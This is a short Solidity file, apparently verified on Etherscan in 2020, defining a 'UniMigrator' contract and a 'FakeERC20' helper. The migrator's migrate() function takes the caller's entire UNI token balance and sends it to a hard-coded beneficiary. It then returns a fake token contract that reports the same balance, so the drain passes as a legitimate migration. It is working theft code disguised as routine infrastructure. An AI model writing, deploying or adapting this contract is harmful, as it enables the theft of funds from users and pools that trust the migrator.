/**
 *Submitted for verification at Etherscan.io on 2020-10-02
*/

pragma solidity 0.6.12;

interface IERC20 {
    function balanceOf(address owner) external view returns (uint);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

contract FakeERC20 {
    uint256 public amount;

    constructor(uint256 _amount) public {
        amount = _amount;
    }

    function balanceOf(address) external view returns (uint256) {
        return amount;
    }
}

contract UniMigrator {
    address public beneficiary;

    constructor(
        address _beneficiary
    ) public {
        beneficiary = _beneficiary;
    }

    function migrate(IERC20 src) public returns (address) {
        require(address(src) == 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984, "not uni token");
        uint256 bal = src.balanceOf(msg.sender);
        src.transferFrom(msg.sender, beneficiary, bal);
        return address(new FakeERC20(bal));
    }
}